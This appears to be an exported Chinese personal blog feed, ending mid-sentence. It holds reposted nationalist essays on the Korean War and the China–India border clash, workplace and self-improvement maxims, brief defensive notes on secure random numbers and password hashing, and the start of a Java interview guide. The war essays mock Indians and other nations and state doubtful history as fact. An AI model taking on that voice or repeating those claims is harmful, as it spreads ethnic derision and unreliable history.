你大爷还是你大爷。我们中国人不管在国内也好，在国外也好，都很我行我素，像极了美国人招人讨厌的样子，为什么？咱打过全世界啊，到哪咱都不怵。你韩国人不服？老子打到过汉城。你印度人不服？老子打到过新德里。你美国人不服？不服来战啊。你越南人……哦，你越南人服，服就好。人都有攀比心理，你不攀比，就找不到自己的位置。抗美援朝就相当于一个三辈贫农，本来在村里抬不起头，突然发现祖上留下的锅碗瓢盆原来都是稀世国宝，一下子可以在村里挺起胸膛走路了。如果没有抗美援朝，你永远觉得自己比发达国家矮一头，觉得不如人家。可抗美援朝让你知道了，什么狗屁发达国家，不过如此。你看即便我们把世界一半的国家都干翻了，还是有那么多膝盖长根站不起来的人，若没有抗美援朝那得是什么后果啊。一个人自信的建立，没有别的办法，就是通过比较，较量得来的。</p><p>我们常说成为联合国常任理事国的条件，就是开启那几个副本。因为大家都清楚，虽说我们之所以加入联合国是亚非拉兄弟捧场，可人家之所以给你捧场，还是因为你能打啊。抗美援朝，抗美援越，两场战争换来了联合国常任理事国的地位。而这里面，抗美援朝就是我们的副本，是决定性的，抗美援越，只是再一次展示了我们的能力而已。</p><p>最后，抗美援朝，造就了人类历史上单兵素质最强的陆军。其战术素养，战斗意志，执行能力，指挥艺术，均达到了人类巅峰。若装备再好一些，将引人无限遐想。体育比赛讲究个心理优势，打仗何尝不是呢？通过抗美援朝，民族自信起来了，军队自信起来了，不好战但不怕战的人民解放军从此成为了世界军事史上的辉煌篇章。</p><hr><p>分析</p><ul><li>比喻开头</li><li>给人一种“醍醐灌顶”的感觉</li></ul>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>职场经验</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/workplace-rule/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/workplace-rule/</url>
      
        <content type="html"><![CDATA[<p>作者：匿名用户<br>链接：<a href="https://www.zhihu.com/question/68467783/answer/1285222346" target="_blank" rel="noopener">https://www.zhihu.com/question/68467783/answer/1285222346</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>1.领导夸你勤奋，工作做的好，大多并不是真的觉得你好，而是想让你更加卖力的干活。</p><p>2.你的工资是由你面试通过之后人力资源部咨询你直属领导之后拍的板，你直属领导是决定你薪资的人，我会尽可能给下属争取最高的薪资。</p><p>3.每个人都喜欢有计划，有节点的汇报。</p><p>4.每个公司都有无休止的斗争，部门负责人比普通员工承受的更多，需要随时举着盾牌和斧头，做更多的战斗，这不是因为社会黑暗，而且源于公司层面或者说这个社会的顶层设计，我们都是棋子，車要做好“車”，炮要做好“炮”。</p><p>5.即使你再受重视，工作做的再出色，高层永远都只是全盘考虑，不要想着阻挡这个机器的前进。</p><p>6.利益是维系平衡的纽带。</p><p>7.当一个人快被杀头的时候，他会拉上任何一个人，只要有一丝可能让他续命。</p><p>8.讲话永远要风轻云淡。</p><p>9.日常沟通不要有情绪，甚至不要让别人认为你有情绪。</p><p>10.看清楚你自己手里有什么牌，要不起的时候就别耍横，该低头就低头。</p><p>11.趟不起的浑水别进去，有可能被杀头的事情不要做。</p><p>12.即便是喝多了，一句错话也能轻易给领导留下坏印象，葬送你在一个公司的前途。</p><p>13.职位越高，担的事情越多，做一个小职员比当所谓的领导，要幸福和开心的多。</p><p>14.直属领导永远是你必须时刻尊重的人，可以提建议，领导喜欢建设性的建议；不要不执行命令，不要顶撞，甚至甩锅给领导，即使你要离职了，也不要这么做，圈子太小了。</p><p>15.职场拼到一定高度，拼的其实是人品。</p><p>16.人们都是有仇必报的，没一个人会安静地吃你给的闷屁，真的是高手，报之前是不会让你知道的，而且一出手就是杀招。</p>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>成为更好的人</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/to-better-one/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/to-better-one/</url>
      
        <content type="html"><![CDATA[<p>写于自己的知乎回答：</p><p><a href="https://www.zhihu.com/question/266090769/answer/898675594" target="_blank" rel="noopener">https://www.zhihu.com/question/266090769/answer/898675594</a></p><h2 id="健康"><a href="#健康" class="headerlink" title="健康"></a>健康</h2><ul><li>无论如何都要吃早饭</li><li>保持运动</li></ul><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><ul><li>遇到任何事务，不要慌和着急，用心一点一点做好，用一次到位的心态来做，做到质量第一，不贪多</li><li>时间法则，要事第一，马上行动，绝对不要拖延，做到快速响应</li><li>强大的行动力、意志力、必须按照计划完成任务</li><li>说话要慢一些，稳一些</li><li>晚上最迟11:30睡觉，早上7点起床 无论任何事情，坚决不要熬夜加班，最迟9:30。</li><li>正面看待公司发展，切忌背后负面评论公司，无论是谁，不评价公司政策，帮助公司成功</li><li>不在公司、同事之间说关于过于私人的问题</li><li>学会倾听，发问，讲故事；这是沟通的三大法宝，和人沟通需要尊重对方、站在对方角度思考问题。</li><li>处理突发问题，关注未来，聚焦解决方法而不是问题本身。</li><li>坚持写作，每本书都要有读书笔记，优秀的文章提炼出博客</li><li>切忌消极，遇到问题想办法，思考确认过后再答复，而不是说不行。</li><li>切忌抱怨，也没必要什么事情都和人交流、不必什么事情都要寻求别人认同。</li><li>禁止卖弄、去除表现欲，坚持自己的核心竞争力即可，其他东西不要炫耀</li><li>禁止推卸责任，遇到问题先处理，不要计较谁的对错</li><li>不要在公司做无关的事情(不开空间、不开淘宝、不开其他无关的网页)，学习除外。</li><li>任何工作首先需要关心产出，不要做无用功，事情要做细 ，做的比预期多一点</li></ul><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><ul><li>系统了解知识，但是实践却要小量的、实实在在的获取知识，切忌读书多但是浅薄，并且加以实践，每次学习都要有作品出现才行，无论作品好还是坏。</li><li>别人做的不好、BUG，不要指出，做好自己事情，切记多管闲事，不要和别人比较得失，心态非常重要。</li><li>学习的方法 学习-&gt;考核-&gt;应用，如此循环</li></ul><h2 id="处事"><a href="#处事" class="headerlink" title="处事"></a>处事</h2><ul><li>保持真诚和一颗平等的朴实的心，一定要尊重他人，并且应该节俭。</li><li>记住他人的名字，别人介绍的时候尽力记下，空间和留言记得回复，不要以太忙为借口。</li><li>禁止好为人师</li><li>和光同尘，不能自恃清高，学会和人融入，而不是特立独行，如果当前环境不能和自己能力持平，请向更高处发展。</li><li>尊重他人的爱好、兴趣、选择、价值</li><li>礼尚往来，生日、活动、结婚必须准备礼物，至少打电话，认真实施。</li><li>无论多累朋友换了号码，都要更新电话，微信及时更新称呼和备注。</li><li>要有正能量，积极向上，不能抱怨。</li><li>活泼、开朗、遇到麻烦要冷静、沉稳、处变不惊。 大方、自然的关心他人、女孩子，可以自然的接触和关怀，例如把肩（马路边车子太多）、牵手（爬山）、背（累了）抱（伤心或者气氛得当的时候），无论是女神还是- 普通女孩，平等对待，切忌唯唯诺诺，不要卑躬屈膝。</li><li>君子成人之美，做好自己的事情，不要嫉妒和比较，为别人的成就高兴，不要拿自己和别人比较，自己应该和过去的自较，过好每一天。</li><li>女生面前不能计较太清楚和小气，珍惜每一个对你好的女孩。</li><li>学会兼爱，好好对待和你不合的人，禁止批评别人，学会处下不争，但同时也切忌交浅言深。</li><li>不与上级争锋，不与同级争宠，不与下级争功。</li><li>待人以宽，待己以严</li><li>遇到任何人主动打招呼，别不好意思。</li><li>先做再说，或者做了不说，切记到处说而不做，会沟通不是话多。</li><li>事情想好，使用SWOT，学会做出决策，不要后悔、犹豫，想好了就要勇敢去做。</li><li>很多事情，不要将就（比如买房、买东西），参考大多数人的决定，走主流路线</li><li>不要暴露需求感、负面情绪，没有任何人会帮助你</li><li>保持某种程度的独立，尽量消除依赖，家人、工作伙伴</li><li>不要讨好，过于在乎别人的看法</li><li>不要多事，创新之前首先是靠谱。</li><li>照顾他人的想法和感受</li><li>考虑问题不要过于理想化，多想想有什么不好的方面以及plan b，也不要拖延</li></ul>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【佳作分析】 印度人，你挑战的是人类轻步兵的巅峰</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-example-pla/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-example-pla/</url>
      
        <content type="html"><![CDATA[<p>来源：<a href="https://mp.weixin.qq.com/s/ZySJ0qJDy1fZ7gV7npGDaw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZySJ0qJDy1fZ7gV7npGDaw</a></p><p>这几天，印度士兵又在边境挑衅我军，在我军只动用了棍棒和石块的情况下，印度自称死了20人。<br>对于中印的这次冲突，我一点都不担心。<br>放眼全球，只有美军有资格成为中国军队的对手，而即便是美军，也不敢在陆军领域和中国争锋。<br>印度，不可能在中国这里占到便宜。<br>因为印度人面对的，正是中国陆军，人类轻步兵的巅峰。<br>很多人说，中国人民志愿军能在朝鲜战争打平美军，靠的是不怕死的精神。<br>在这种说法的引导下，还冒出了很多志愿军靠人海战术取胜的谣言。<br>战士不怕死，确实很重要，但并不是战争胜负的决定性因素。<br>如果不怕死就能打赢战争，义和团是能打赢八国联军的。<br>这么一发炸弹在你的阵地上爆炸之后，你怕不怕死，很重要么？ </p><p>一堆不会动弹的碎片，即便再不怕死，你的敌人也不会给予丝毫关注。<br>在现代化的火力面前，人海没有任何意义，纯粹属于送人头的。<br>但志愿军的火力远远不如美军，还没有海军和空军，在现代军事理论的推演下，志愿军必败无疑，但实战结果却是平手。<br>这种战果说明志愿军一定在某一个领域远远强于美军，强平抹平了火力方面的差距。<br>军事学家通过仔细研究，最终找到了志愿军强大的秘密，那就是能聚能散。<br>在现代战争领域的理论中，军队是一定要聚在一起的，离散的军队是没有战斗力的。<br>军队一旦失去建制，哪怕还有数万人存活，都会直接默认他们的战斗力归零，作战指挥中将不再考虑这只军队的存在。<br>由于部队只有聚在一起才能形成战斗力，所以军队的调动极为笨拙，双方经常会为了一个交通要道反复争夺几个月，轻兵突进是兵家大忌。<br>在这种理论的支持下，军队展开后的防线，是由多个零散的阵地组成，阵地和阵地之间的空隙极大，这样可以用极少的士兵，控制极大的土地。<br>但这些空隙，敌方大军是无法通过的，根本不敢绕开。<br>如果敌军要挨个敲掉这些零散阵地，那我方就有足够的时间给予增援。<br>这是普通军队的打法。<br>在解放战争中，解放军发明了一种大纵深穿插迂回的办法，可以无视对方的阵地，肆意机动穿插，彻底掌控战场，让自己的部队轻易在局部战场形成以多打少的局面。<br>一开始，是连级和排级的小规模小纵深穿插。<br>到最后，是整个团，整个师，甚至整个兵团的大规模大纵深穿插。<br>解放军第一次使用大规模大纵深穿插，就是孟良崮之战，歼灭了国民党王牌军整编74师，击毙名将张灵甫。 </p><p>整编74师的战斗力极强，如果1比1的战斗，胜负尚未可知，但我军不打算和74师公平决战。<br>孟良崮之战，国民党共投入兵力45万人，解放军共投入兵力27万人，敌我兵力比为2比1。<br>看似国民党的兵力占优势，但经过大规模机动，孟良崮周边百里之内，总共只有国民党军13.5万人，而解放军聚集了20余万人，敌我兵力比变成了1比2。<br>而在孟良崮10里之内，解放军聚集了五个纵队共十余万人，狂攻张灵甫的2.6万人，敌我兵力比达到1比5。<br>从整个战场来看，是解放军寡不敌众，但是在孟良崮这里，是张灵甫寡不敌众。<br>精锐的74师，在十余万人的狂攻下，三天就彻底崩溃了。<br>此战，张灵甫部全军覆灭，国民党援兵伤亡六千余人，合计伤亡3.2万人，而解放军伤亡1.2万人，并成建制的消灭了国民党王牌部队74师，是一场辉煌的大胜。<br>在解放军的大规模大纵深穿插战术面前，国民党军犹如提线木偶一样被遛着走，不管投入多少部队，都永远无法包围解放军，而且永远在被解放军包围。<br>无视敌方阵地肆意穿插这一招太厉害了，但至今为止，地球上只有解放军能使出这一招。<br>普通军队是能把小股部队从敌方阵地的空隙中渗透过去的，也能在敌后完成独立作战任务，这样的军队一般称之为特种部队。<br>几百人甚至几千人的特种部队是能培养出来的，但几万人甚至几十万人的部队完成这种战术穿插。<br>不是做不到，是培养不出来那么多特种部队。<br>要想实现大规模大纵深穿插，第一个要做的，就是拥有对战场的绝对掌控力。<br>如果你几千人刚穿插就被敌军发现，那等待你的就是敌方的火力屠杀。<br>解放战争时，我们发现国民党军好像瞎了一样，连几公里之外的解放军都无法发现，常常嗤笑国民党军太过无能。<br>但是到朝鲜战场时，美军的表现还不如国民党军，甚至连几百米外的志愿军都无法发现。<br>敌军完全无法掌控你的行踪，这是想实现大规模大纵深穿插战术的首要前提。<br>朝鲜战争前几次战役中，美军都表现出了惊人的迟钝，在有空中侦察的前提下，连志愿军在哪，出动了多少人都搞不清楚，被打的晕头转向。<br>这种战场的掌控力，是靠一群堪比特种部队的士兵实现的。<br>邱少云的事迹大家应该都听说过。<br>邱少云和数百名战友，潜伏在离美军阵地只有几百米的地方，在美军的火力侦察中邱少云周围的荒草被燃烧弹给点燃了，为了不暴露潜伏部队，邱少云一声不吭，全身都被烧焦，直到壮烈牺牲。</p><p>邱少云牺牲油画 </p><p>邱少云军衣残片<br>邱少云的案例不仅说明了志愿军战士拥有极高的纪律性和牺牲精神，而且还说明了一件事实，有高达数百人的部队在美军眼皮子底下潜伏了一整夜，结果美军根本没有发现这股部队。<br>这说明美军已经彻底失去了对战场的掌控。<br>而在长津湖战役中，志愿军的纪律性和牺牲精神体现的更为明显。<br>当时的夜间气温，已经低到了零下40℃，但大量的志愿军依然在夜色的掩护下进行潜伏运动，这导致冻伤减员远远超过了战斗减员。<br>志愿军第八十一师第二四二团第五连奉命在美军撤退途中设伏，但是当战斗打响后，却无一人站起来冲锋。<br>已经展开战斗队形的五连，整整一个连的干部和战士，全部被冻死在了阵地之上。 </p><p>在夜色中被冻死的志愿军战士，很多很多，远不止一个五连，他们的遗体送到后方后，都还保持着卧倒的战斗姿态。 </p><p>而被冻伤冻残的志愿军，更是不计其数。<br>纪律性如此之强的部队，拥有犹如隐形的运动能力，可以随时发动出其不意的打击。<br>为什么只有特种部队才能轻兵突进？<br>因为如果你绕开了对方的阵地，就意味着你的后勤送不上去，你的部队将陷入无后勤的状态。<br>一枚榴弹炮弹重86斤。<br>没有后勤，你能带几发炮弹？<br>只有对后勤依赖极小的轻步兵，才有资格无视对方的阵地，只需要携带少量的食物和手榴弹，就能维持战斗力。<br>但如果你这么做了，就意味着你这支轻步兵，将进入敌后，彻底丧失火力支援，同时随时可能被分割包围，意志稍微不坚定一点，就会消极作战。<br>所以只有经过严格训练的特种部队可以这么做，普通的部队一旦散开，战斗力将出现断崖式下降。<br>任何一个指挥官都知道部队能聚能散的好处，但没人敢这么做。<br>但志愿军是个例外。<br>志愿军天生就没有多少重火力，长期习惯在无火力的环境下战斗，长期习惯在无后勤的敌后作战，并全员拥有强大的意志力，这就铸造出了一支全部由特种部队组成的军队。<br>所以大规模大纵深穿插战术，全球只有中国军队能用，其他国家想学都学不来。<br>美军从未见过这样的对手，在这种极其灵活多变的战术面前被打的苦不堪言，部队调动畏畏缩缩，感觉像在被捆起来打仗。<br>直到第五次战役，美国的李奇微终于发现了大规模大纵深穿插战术的弱点，并差点给了志愿军致命一击。<br>刚才说了，普通军队因为必须要聚在一起并保持后勤，行军必须要敲掉对方的阵地，所以感觉特别僵化笨重。<br>而志愿军的大规模大纵深穿插战术可以无视对方的阵地，轻易从阵地空隙中渗透过去，犹如液体一样肆意穿插机动，所以特别灵活，可以轻易围歼对手。<br>但这种战术是有弱点的。<br>任何军队采用这种战术，都注定了无后勤，因为背后的敌军阵地没有被敲掉。<br>轻步兵之所以可以采用这种战术，是因为自身对后勤的需求极小。<br>但再小，也是有需求的。<br>李奇微经过研究发现，志愿军的大纵深穿插战术，轻步兵身上携带的物资，最多只能维持7天。<br>后来李奇微就想出了一个特别阴损的战术，先放纵志愿军的穿插，故意示弱，诱敌深入。<br>激战一个月后，美军连续后撤，由于多个美军阵地没有被敲掉，解放军的后勤补给极为困难，补给线的运输时间，达到了7天。<br>此时，美军集中优势兵力，用精锐装甲部队开路，直接撕开了志愿军的阵地，目标直指铁原。<br>铁原是志愿军位于后方的一个核心后勤基地，囤积了解放军的大量物资，位于运输便利的平原地带。<br>如果铁原被攻占，那么前线的志愿军，将失去所有补给，会陷入弹尽粮绝的境地。<br>向前打，没弹药，向后撤，没粮食，全军覆灭是唯一的宿命。<br>一旦这么多部队溃败，美军将赢得朝鲜战争的胜利。<br>为了准备这必杀一击，美军出动了王牌主力骑一师为核心组成的特遣队，共4.7万余人，火炮1327门，坦克187辆，并准备了2000架次的飞机。<br>这支特遣队一直藏在后方，不参与任何作战，等前线志愿军的物资消耗的七七八八时，全军突击。<br>作战目的只有一个，那就是攻占铁原，打掉这个志愿军的后勤中枢，随后彻底分割包围前线的所有志愿军。<br>如果成功，这就是另一个版本的仁川登陆，志愿军将陷入大溃败。<br>发现这支特遣队的动向后，志愿军立刻全军后撤。<br>但撤退需要时间，两条腿是跑不过四个轮子的。<br>重新组织防线，志愿军需要总共15天的时间，但特遣队只需要一天多的时间就可以抵达铁原，这里还是平原地带，特别适合美军火力的发挥。<br>能及时赶到铁原的部队，只有63军，麾下三个师共2.5万人，火炮240余门，没有坦克飞机。<br>彭老总给63军下了死命令，一定要死守铁原15天时间。<br>63军的军长傅崇碧估摸了一下敌我的实力对比，认为只有构筑强大的野战工事，才有可能完成这一目标。<br>而构筑强大的野战工事，需要至少3天时间，但美军特遣队已经到门口了。<br>于是傅崇碧给麾下189师的师长蔡长元下了一个死命令，一定要拖住美军3天时间，给63军留出修工事的时间。<br>189师修工事的时间，仅有几个小时。<br>蔡长元反复计算了敌我的实力对比，发现无论怎么打，都不可能拦得住美军。<br>如果没有工事的掩护，那在火炮面前数量是没有意义的。<br>哪怕全军牺牲，可能都无法拦得住美军一天时间。<br>如果被美军突破了阵地，那正在后方修筑工事的63军将全军大乱。<br>如果63军也被突破了阵地，那整个前线的几十万志愿军，就有全军覆没的危险。<br>就算189师全军牺牲，也挡不住美军。但现在作为师长，蔡长元必须找出一个能挡住美军3天以上的办法。<br>怎么办？<br>蔡长元做了一个前无古人也后无来者的决定，把志愿军能聚能散的特点给发挥了淋漓尽致，让铁原狙击战成为了人类轻步兵战史上的巅峰之战。<br>189师，被原地解散了，解散成了200余个小股部队，分散到20公里宽，25公里深，总计500平方公里的庞大区域，建立了200余个简陋阵地。<br>每个阵地的战士，仅有30余人，各自为战。<br>这种战术让李奇微目瞪口呆，完全颠覆了他作为一个军事家的常识。<br>作战之前李奇微推演了多种可能，但唯独没有推演过这一种。<br>美军特遣队4.7万人聚集在一起，1327门火炮和187辆坦克开路，面对的是一个仅有30余轻步兵的简陋阵地。<br>摆开阵势后，只需要几十分钟，美军就能轻易撕碎这个阵地，防御的志愿军不可能幸存。<br>这特么不是送死吗。<br>但这样的阵地，足足有200多个，如果这样一个一个敲下去，等敲完了阵地，三天时间就已经过去了。<br>189师的任务，就完成了。<br>这种战术看起来非常的简单有效。<br>但放眼全球，只有志愿军能采用这种原地解散的战术，其他国家的军队怎么都不可能学得会。<br>我给大家讲一讲，这里面的难点。<br>首先，你采用这种战术之后，等于直接了当的告诉你手下所有的士兵，这一仗我们是必输的，目的只是为了完成战略任务。<br>而不管这个任务是否完的成，前线阵地上的战士，都是必死无疑的，连一点生的希望都没有。<br>这样的作战任务，有几个士兵愿意去执行？<br>足足200多个阵地，每个阵地间隔几百米。<br>第一个接触美军的阵地，在几十分钟之内就被撕成了碎片，上面的战士无一幸存。<br>后面的几十个阵地都看的清清楚楚，但不能支援，只能眼睁睁的看着前线的战友去死。<br>而且他们还知道，下一个会死的，就是自己，而且是必死无疑。<br>普通军队极其重视先锋部队的首战，首战若胜则士气如虹，首战若败则军心动荡。<br>而189师如今面对的情况是，每隔几十分钟就会传来一次先锋部队全军覆灭的消息。<br>第一个阵地全军覆没了，上面的战友全死了。<br>第二个阵地全军覆没了，上面的战友全死了。<br>第三个阵地全军覆没了，上面的战友全死了。<br>。。。<br>碰到这种情况，普通的军队早就士气崩溃了，轻则消极作战，重则直接投降。<br>而189师，足足被连续摧毁了上百个阵地，牺牲了一半以上的战士，但依然保持着旺盛的斗志，成功的坚持了3天时间，为后方的工事修建留出了足够的时间。<br>最终，63军成功的坚守了15天时间，让前线的主力部队完成了后撤，重新稳固了阵地。<br>李奇微不得不铩羽而归，再不走，特遣队就要被包饺子了。<br>在如此优势的作战环境下，美军依然没有完成自己的作战任务，这让美国彻底失去了胜利的信心，并终于愿意坐下来进行认真的和谈。<br>前几次战役中，志愿军表演了什么叫能散能聚，部队神出鬼没，轻易聚集在一起，在局部战场形成对美军的合围，以优势兵力歼灭敌人。<br>第五次战役中，志愿军表演了什么叫能聚能散，已经聚集在一起的部队主动散开，逐个牺牲，通过惊天动地的牺牲精神，完成了战略任务。<br>你说志愿军不怕死，那确实是真的不怕死。<br>但这种不怕死，不是那种无谓的牺牲，更不是什么人海冲锋，而是每一个士兵都要死的有价值。<br>李奇微曾经派出一个营来模仿志愿军的这种战术，结果发现失去了后勤补给，失去了重炮火力支援，只能贴身扔手榴弹的美国陆军。<br>啥也不是，就是送人头的。<br>志愿军这种能聚能散的战术，多个国家都曾试图模仿，但无一例外的都失败了，散开的部队战斗力都急剧下滑，只在少量特种部队身上获得过成功。<br>而这个事实意味着，解放军的每一支轻步兵部队，放在国外都是特种部队的水平。<br>这就是为什么中国军队被称之为全球第一陆军，人类轻步兵巅峰的原因。<br>前无古人，我估计也后无来者。<br>极其特殊的背景，极其特殊的文化，极其特殊的体制，才导致了中国军队具备了这样的特色和战斗力。<br>志愿军的空军、海军、重火力，确实远远不如美军，但依靠轻步兵的优势，双方硬生生的打成了平手。<br>在解放战争时，美国朝野上下对蒋介石的军事能力非常鄙视，认为国民党军就是浪费钱的废物。<br>打完朝鲜战争后，美国人突然发现，蒋介石用那么一点钱组织起来的军队，就和解放军在陆地上纠缠了四年，真的是一员不可多得的大将。<br>然后，蒋介石的地位大大提高。<br>而在中印边境这种地方，双方对决的主力正好就是步兵，中国军队最擅长的领域。<br>美国还能靠空军和重火力勉强打成平手，但印度啥都没有。<br>空军不如中国，重火力不如中国，轻步兵还是不如中国。<br>印度拿什么和中国打，拿咖喱打？</p><p>和部队失散的庞国兴拥有独立战斗能力并立下大功</p><p>1962年的那次对印自卫反击战里，印度败的很惨。<br>如果现在再打一次，那印度只会败的更惨，因为中印之间的国力差距，比1962年的时候大太多太多了。<br>所以我对这一次的中印冲突一点都不担心，印度人只要脑子清醒就不敢打。<br>如果咖喱吃多了脑子不清醒，那我们也不介意帮他们清醒一下。<br>人类轻步兵的巅峰，不是印度人有资格挑战的。</p>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>常用安全随机数发生器或者接口</title>
      <link href="/%E5%AE%89%E5%85%A8/security/sec-random/"/>
      <url>/%E5%AE%89%E5%85%A8/security/sec-random/</url>
      
        <content type="html"><![CDATA[<p>C 语言中的  rand random，java 中的 Random 都是伪随机数，在安全性要求高的场景，应该使用安全随机数。</p><p>Unix/Linx 平台应该使用 /dev/random</p><p>Java 语言中应该使用 SecureRandom 代替 Random。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>加密算法选择和参数</title>
      <link href="/%E5%AE%89%E5%85%A8/security/encryption-selection/"/>
      <url>/%E5%AE%89%E5%85%A8/security/encryption-selection/</url>
      
        <content type="html"><![CDATA[<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><h2 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h2><h2 id="HASH-算法"><a href="#HASH-算法" class="headerlink" title="HASH 算法"></a>HASH 算法</h2><p>HASH 算法的特点：</p><ol><li>消息摘要</li><li>数字指纹</li><li>单项散列</li></ol><p>常用的 hash 算法有：MD5、SHA-1、SHA-256。</p><p>在不同场景下选用不同的 HASH 算法：</p><ol><li>口令 HASH 使用 PBKDF2 算法，目的是加盐和增加迭代次数，使用 SHA256 + 迭代的算法。<ol><li>盐值使用8字节以上，迭代 10000 次以上。</li></ol></li><li>消息认证。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 服务端高级工程师面试合集</title>
      <link href="/interview/interview/java-server-enginer-interview/"/>
      <url>/interview/interview/java-server-enginer-interview/</url>
      
        <content type="html"><![CDATA[<p>这套资料只是整理了这些考点，和简单的解释，更为深入的细节，限于篇幅不可能包含，请参考相关资料学习。</p><p>本材料可以作为：</p><ul><li><p>学习大纲</p></li><li><p>面试快速梳理</p></li><li><p>计算机复习</p></li></ul><h2 id="计算机通识"><a href="#计算机通识" class="headerlink" title="计算机通识"></a>计算机通识</h2><h3 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h3><h4 id="十进制的数在内存中是怎么存的？"><a href="#十进制的数在内存中是怎么存的？" class="headerlink" title="十进制的数在内存中是怎么存的？"></a>十进制的数在内存中是怎么存的？</h4><p>补码的形式。</p><p>计算机中的有符号数有三种表示方法，即原码、反码和补码。三种表示方法均有符号位和数值位两部分，符号位都是用0表示“正”，用1表示“负”，而数值位，三种表示方法各不相同 。在计算机系统中，数值一律用补码来表示和存储。原因在于，使用补码，可以将符号位和数值域统一处理；同时，加法和减法也可以统一处理 。</p><p>补码的本质：解决了符号的表示的问题，可以将减法运算转化为补码的加法运算来实现，克服了原码加减法运算繁杂的弊端，可有效简化运算器的设计。补码表示统一了符号位和数值位，使得符号位可以和数值位一起直接参与运算，这也为后面设计乘法器除法器等运算器件提供了极大的方便。</p><h3 id="计算机语言和编译原理"><a href="#计算机语言和编译原理" class="headerlink" title="计算机语言和编译原理"></a>计算机语言和编译原理</h3><h3 id="操作系统理论"><a href="#操作系统理论" class="headerlink" title="操作系统理论"></a>操作系统理论</h3><h4 id="64位和32位的区别？"><a href="#64位和32位的区别？" class="headerlink" title="64位和32位的区别？"></a>64位和32位的区别？</h4><p>操作系统只是硬件和应用软件中间的一个平台。32位操作系统针对的32位的CPU设计。64位操作系统针对的64位的CPU设计。</p><p>64 比 32 位的寻址空间更大，也就意味着可以使用更多的内存。</p><h4 id="CentOS-和-Linux的关系？"><a href="#CentOS-和-Linux的关系？" class="headerlink" title="CentOS 和 Linux的关系？"></a>CentOS 和 Linux的关系？</h4><p>CentOS是Linux众多得发行版本之一，linux有三大发行版本（：Slackware、debian、redhat）,而Redhat有收费的商业版和免费的开源版,商业版的业内称之为RHEL系列，CentOS是来自于依照开放源代码规定而公布的源代码重新编译而成。可以用CentOS替代商业版的RHEL使用。两者的不同，CentOS不包含封闭源代码软件，是免费的。</p><h4 id="请解释一下，LINUX下的线程，GDI类"><a href="#请解释一下，LINUX下的线程，GDI类" class="headerlink" title="请解释一下，LINUX下的线程，GDI类"></a>请解释一下，LINUX下的线程，GDI类</h4><p>LINUX实现的就是基于核心轻量级进程的”一对一”线程模型，一个线程实体对应一个核心轻量级进程，而线程之间的管理在核外函数库中实现。</p><p>GDI类为图像设备编程接口类库。</p><h4 id="进程和线程的区别是什么？"><a href="#进程和线程的区别是什么？" class="headerlink" title="进程和线程的区别是什么？"></a>进程和线程的区别是什么？</h4><p>进程是执行着的应用程序，而线程是进程内部的一个执行序列。一个进程可以有多个线程。线程又叫做轻量级进程。</p><h4 id="谈一谈，系统线程数量上限是多少？"><a href="#谈一谈，系统线程数量上限是多少？" class="headerlink" title="谈一谈，系统线程数量上限是多少？"></a>谈一谈，系统线程数量上限是多少？</h4><p>Linux 系统中单个进程的最大线程数有其最大的限制 PTHREAD_THREADS_MAX。</p><p>这个限制可以在/usr/include/bits/local_lim.h中查看 ，对 linuxthreads 这个值一般是 1024，对于 nptl 则没有硬性的限制，仅仅受限于系统的资源。</p><p>这个系统的资源主要就是线程的 stack 所占用的内存，用 ulimit -s 可以查看默认的线程栈大小，一般情况下，这个值是8M=8192KB。</p><h4 id="讲一讲，线程与进程的区别"><a href="#讲一讲，线程与进程的区别" class="headerlink" title="讲一讲，线程与进程的区别"></a>讲一讲，线程与进程的区别</h4><p>进程和线程的主要差别在于它们是不同的操作系统资源管理方式。进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个线程死掉就等于整个进程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。但对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。</p><ol><li>简而言之,一个程序至少有一个进程,一个进程至少有一个线程.</li><li>线程的划分尺度小于进程，使得多线程程序的并发性高。</li><li>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</li><li>线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。</li><li>从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。</li></ol><h4 id="如何杀死一个进程？"><a href="#如何杀死一个进程？" class="headerlink" title="如何杀死一个进程？"></a>如何杀死一个进程？</h4><ol><li>kill 